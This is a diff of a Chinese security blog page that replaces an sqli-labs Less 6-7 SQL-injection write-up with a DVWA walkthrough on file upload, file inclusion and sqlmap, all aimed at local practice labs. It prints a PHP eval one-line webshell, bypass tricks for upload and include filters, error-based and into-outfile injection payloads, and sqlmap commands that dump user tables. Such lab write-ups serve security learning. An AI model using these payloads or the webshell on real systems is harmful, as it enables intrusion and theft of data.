@@ -4,12 +4,17 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqli-lab  less6-7, 是小竹不是小猪">
-    <meta name="description" content="less6- ”闭合报错注入步骤一：sqlmap进行扫描
+    <meta name="keywords" content="文件上传 DVWA, 是小竹不是小猪">
+    <meta name="description" content="文件上传Low源码分析:没有过分限制于提交文件的格式编写一句话木马并且进行提交
+文本内容是
+&amp;lt;?php
+@eval($_POST[&amp;#39;hack&amp;#39;])
+?&amp;gt;
 
-由结果可以得知注入形式为双引号闭合，并且可以使用报错注入。
-爆数据库名称
-id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
+
+在图中目录中查看已经提交的hack.php文件
+
+打开">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +26,7 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqli-lab  less6-7 | 是小竹不是小猪</title>
+    <title>文件上传 DVWA | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -313,12 +318,12 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqli-lab  less6-7</h1>
+                    <h1 class="description center-align post-title">文件上传 DVWA</h1>
                 </div>
             </div>
         </div>
@@ -446,7 +451,7 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-28
+                    2022-03-07
                 </div>
                 
 
@@ -467,82 +472,71 @@ id=-1&amp;quot; and updatexml(1,concat(0x7e,database(),0x">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="less6-”闭合报错注入"><a href="#less6-”闭合报错注入" class="headerlink" title="less6- ”闭合报错注入"></a>less6- ”闭合报错注入</h2><p>步骤一：sqlmap进行扫描</p>
-<p><img src="/2022/02/28/0227/1.PNG" alt="1"></p>
-<p>由结果可以得知注入形式为双引号闭合，并且可以使用报错注入。</p>
-<p>爆数据库名称</p>
-<pre><code class="sql">id=-1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)
+                <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="源码分析-没有过分限制于提交文件的格式"><a href="#源码分析-没有过分限制于提交文件的格式" class="headerlink" title="源码分析:没有过分限制于提交文件的格式"></a>源码分析:没有过分限制于提交文件的格式</h3><h2 id><a href="#" class="headerlink" title></a><img src="/2022/03/07/0307/1.PNG" alt="1"></h2><p>编写一句话木马并且进行提交</p>
+<p>文本内容是</p>
+<pre><code class="php">&lt;?php
+@eval($_POST[&#39;hack&#39;])
+?&gt;
 </code></pre>
-<p><img src="/2022/02/28/0227/2.PNG" alt="2"></p>
-<p>爆表名</p>
-<pre><code class="sql">1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+
+<p><img src="/2022/03/07/0307/2.PNG" alt="2"></p>
+<p>在图中目录中查看已经提交的hack.php文件</p>
+<p><img src="/2022/03/07/0307/3.PNG" alt="3"></p>
+<p>打开蚁剑进行链接，右击新建，添加相关信息。</p>
+<p><img src="/2022/03/07/0307/4.PNG" alt="4"></p>
+<p><img src="/2022/03/07/0307/5.PNG" alt="5"></p>
+<p>右击新添加的url地址，打开文件管理。</p>
+<p><img src="/2022/03/07/0307/6.PNG" alt="6"></p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码分析：对文件上传格式有限制"><a href="#源码分析：对文件上传格式有限制" class="headerlink" title="源码分析：对文件上传格式有限制"></a>源码分析：对文件上传格式有限制</h3><p><img src="/2022/03/07/0307/7.PNG" alt="7"></p>
+<p>利用burp进行抓包。</p>
+<p><img src="/2022/03/07/0307/8.PNG" alt="8"></p>
+<p>将文件类型修改为image/png,进行放包可以提交成功。</p>
+<p><img src="/2022/03/07/0307/9.PNG" alt="9"></p>
+<p><img src="/2022/03/07/0307/10.PNG" alt="10"></p>
+<p><img src="/2022/03/07/0307/11.PNG" alt="11"></p>
+<p>利用蚁剑进行连接。</p>
+<p><img src="/2022/03/07/0307/12.PNG" alt="12"></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h3><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是“*.jpg”、“.jpeg” 、“*.png”之一。同时，getimagesize（）函数更是限制了上传文件的文件头必须为图像类型。<br>我们需要将上传文件的文件头伪装成图片，利用copy命令进行图片和木马进行合并。</p>
+<p>建议选择10kb左右文件，如果文件过大可以使用在线图片压缩工具。</p>
+<p><img src="/2022/03/07/0307/13.PNG" alt="13"></p>
+<p>进行提交成功。</p>
+<p><img src="/2022/03/07/0307/14.PNG" alt="14"></p>
+<h1 id="file-inclusion-文件包含"><a href="#file-inclusion-文件包含" class="headerlink" title="file-inclusion (文件包含)"></a>file-inclusion (文件包含)</h1><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行。</p>
+<p>如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
+<p>我们现在利用漏洞来构造url：<a target="_blank" rel="noopener" href="http://192.168.35.132/DVWA-master/vulnerabilities/fi/?page=%E2%80%9C%E7%94%B5%E8%84%91%E4%B8%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E2%80%9D">http://192.168.35.132/DVWA-master/vulnerabilities/fi/?page=“电脑上任意文件路径”</a></p>
+<p><img src="/2022/03/07/0307/15.PNG" alt="15"></p>
+<p><img src="/2022/03/07/0307/16.PNG" alt="16"></p>
+<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。这里只是过滤了远程包含，但没有过滤本地包含。</p>
+<p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。例如page=htt<a target="_blank" rel="noopener" href="http://p//%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E4%BC%9A%E5%B0%86http://%E5%88%A0%E9%99%A4%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82">http://p://时，str_replace函数会将http://删除，于是page=http://，成功执行远程命令。</a></p>
+<p>因为没有过滤本地包含所以还这样还是可以。。</p>
+<p><img src="/2022/03/07/0307/17.PNG" alt="17"></p>
+<p><img src="/2022/03/07/0307/18.PNG" alt="18"></p>
+<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<br>High级别的代码规定只能包含file开头的文件，看似安全，我们依然可以利用file协议绕过防护策略。</p>
+<p><img src="/2022/03/07/0307/19.PNG" alt="19"></p>
+<h1 id="SQL注入（sqlmap注入）"><a href="#SQL注入（sqlmap注入）" class="headerlink" title="SQL注入（sqlmap注入）"></a>SQL注入（sqlmap注入）</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch
 </code></pre>
-<p><img src="/2022/02/28/0227/3.PNG" alt="3"></p>
-<p>爆字段名</p>
-<pre><code class="sql">http://localhost/sqil/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1) --+--+table_name=‘users’),0x7e),1) --+
+<p>其中cookie获取</p>
+<p><img src="/2022/03/07/0307/21.PNG" alt="21"></p>
+<p>利用sqlmap获取服务器信息</p>
+<p><img src="/2022/03/07/0307/22.PNG" alt="22"></p>
+<p>获取数据库名称</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch --dbs
 </code></pre>
-<p><img src="/2022/02/28/0227/4.PNG" alt="4"></p>
-<p>爆数据</p>
-<pre><code class="sql">1&quot;  and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23 
+<p><img src="/2022/03/07/0307/23.PNG" alt="23"></p>
+<p>获取表</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch -D dvwa --tables
 </code></pre>
-<p><img src="/2022/02/28/0227/5.PNG" alt="5"></p>
-<h2 id="less7–文件读写注入"><a href="#less7–文件读写注入" class="headerlink" title="less7–文件读写注入"></a>less7–文件读写注入</h2><p>利用sqlmap进行扫描</p>
-<p><img src="/2022/02/28/0227/6.PNG" alt="6"></p>
-<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20220227150404246.png" alt="image-20220227150404246"></p>
-<p>发现闭合语句提示id=’) ,但是在尝试的时候发现不能完成闭合，于是尝试了id=’))可以完成。</p>
-<p><img src="/2022/02/28/0227/8.PNG" alt="8"></p>
-<p><img src="/2022/02/28/0227/9.PNG" alt="9"></p>
-<p>证明是否有写入权限：返回正常说明有。</p>
-<pre><code class="sql">http://localhost/sqil/Less-7/?id=1&#39;)) and (select count(*) from mysql.user)&gt;0 --+
+<p><img src="/2022/03/07/0307/24.PNG" alt="24"></p>
+<p>获取列</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch -D dvwa -T users --columns
 </code></pre>
-<p><img src="/2022/02/28/0227/10.PNG" alt="10"></p>
-<p>证明有3列</p>
-<pre><code class="sql">http://localhost/sqil/Less-7/?id=1&#39;)) order by 4 --+  
+<p><img src="/2022/03/07/0307/25.PNG" alt="25"></p>
+<p>爆破数据</p>
+<pre><code class="shell">python2 sqlmap.py -u&quot;http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=tsncchduqf77saphofku5k2q84&quot; --batch -D dvwa -T users --dump
 </code></pre>
-<p><img src="/2022/02/28/0227/11.PNG" alt="11"></p>
-<p>使用下列语句尝试导出</p>
-<pre><code class="sql">http://localhost:80/sqils/Less-7/?id=1&#39;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+
-</code></pre>
-<p>如果发现在该路径下面未出现相关文件，则进行以下操作：</p>
-<p>一、检查权限</p>
-<p>若使用下面方法发现显示正常则权限为root合适，进行下一步。</p>
-<pre><code class="sql">http://localhost:80/sqil/Less-7/?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+
-</code></pre>
-<p>二、需要在指定目录下进行导出</p>
-<p>在mysql的bin文件夹下打开终端输入以下命令，打开mysql命令行。</p>
-<pre><code>mysql -u root -p
-</code></pre>
-<p>输入以下命令检查权限。</p>
-<pre><code class="shell">show variables like &#39;%secure%&#39;
-</code></pre>
-<p><img src="/2022/02/28/0227/14.PNG" alt="14"></p>
-<p>观察secure_file_priv参数，如果是一个路径那么，只能在该路径下导出。</p>
-<p>如果是空，则没有限制，如果是NULL则不允许导出。</p>
-<p>打开Mysql下载文件夹，打开my.ini文件，查找secure_file_priv配置，如果存在则进行修改，如果不存在，则在[mysqld]下加入 secure_file_priv = “F:/data”</p>
-<p><img src="/2022/02/28/0227/19.PNG" alt="19"></p>
-<p><img src="/2022/02/28/0227/20.PNG" alt="20"></p>
-<p>关闭mysql服务并再次重启，查看secure_file_priv，发现改动生效。</p>
-<p><img src="/2022/02/28/0227/13.PNG" alt="13"></p>
-<p>直接使用该路径进行导出，获得数据。</p>
-<p><img src="/2022/02/28/0227/15.PNG" alt="15"></p>
-<p><img src="/2022/02/28/0227/16.PNG" alt="16"></p>
-<p><img src="/2022/02/28/0227/17.PNG" alt="17"></p>
-<pre><code class="sql">
-
-#字段数
-
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &quot;F:\\data\\1.txt&quot; --+
-#数据库名称
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,user(),database() into outfile &quot;F:\\data\\2.txt&quot; --+
-#爆表名
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile &quot;F:\\data\\3.txt&quot;--+
-#爆字段名
-http://localhost/sqil/Less-7/?id=1&#39;)) union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile &quot;F:\\data\\4.txt&quot;--+
-#爆数据
-http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile &quot;F:\\data\\5.txt&quot;--+
-</code></pre>
-<p>参考链接</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7b9256de20d1">https://www.jianshu.com/p/7b9256de20d1</a></p>
+<p><img src="/2022/03/07/0307/26.PNG" alt="26"></p>
 
                 
             </div>
@@ -569,7 +563,7 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/02/28/0227/">http://example.com/2022/02/28/0227/</a>
+                    <a href="http://example.com/2022/03/07/0307/">http://example.com/2022/03/07/0307/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -776,9 +770,48 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/03/07/0307/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="文件上传 DVWA">
+                        
+                        <span class="card-title">文件上传 DVWA</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2022/03/01/0301/">
                     <div class="card-image">
@@ -796,45 +829,8 @@ http://localhost/sqil/Less-7/?id=1&#39;)) union select * from users into outfile
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            小竹
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/02/28/0228/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="sqli-lab  less8-10">
-                        
-                        <span class="card-title">sqli-lab  less8-10</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
                             </span>
                         <span class="publish-author">
                             
